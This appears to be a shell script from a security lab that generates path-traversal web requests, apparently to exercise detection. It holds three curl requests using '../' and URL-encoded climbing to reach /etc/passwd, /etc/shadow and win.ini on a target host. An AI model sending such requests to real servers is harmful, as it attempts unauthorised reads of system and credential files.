#!/bin/sh
# web-path-traversal: ../ climbing and well-known system files.
set -eu
. /lab/scenarios/web-common.sh
echo "SCENARIO_START web-path-traversal $(date -u +%Y-%m-%dT%H:%M:%SZ)"
curl -s -o /dev/null --path-as-is "http://$WEB/../../../../etc/passwd"
curl -s -o /dev/null --path-as-is "http://$WEB/static/..%2f..%2f..%2f..%2fetc/shadow"
curl -s -o /dev/null --path-as-is "http://$WEB/download?file=../../../../windows/win.ini"
echo "SCENARIO_END web-path-traversal"
